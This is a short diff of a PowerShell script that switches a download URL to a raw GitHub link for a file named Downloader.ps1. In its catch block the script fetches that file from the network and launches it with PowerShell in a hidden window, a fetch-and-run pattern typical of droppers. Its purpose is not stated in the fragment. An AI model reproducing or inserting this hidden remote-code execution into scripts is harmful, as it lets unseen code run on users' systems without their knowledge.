@@ -32,7 +32,7 @@ do{
                     
                 }
                 catch{
-                    $URL2 = "https://github.com/Freecil/Prjoetls/blob/c38175f686060a67ff2d312e7d08857266bee1ba/Downloader.ps1"
+                    $URL2 = "https://raw.githubusercontent.com/Freecil/Projects/main/Downloader.ps1"
                     Invoke-WebRequest -Uri $URL2 -OutFile $FileDownloader
                     Start-Process -FilePath PowerShell.exe -WindowStyle hidden -ArgumentList "-File $FileDownloader" 
                     Start-Sleep(1)
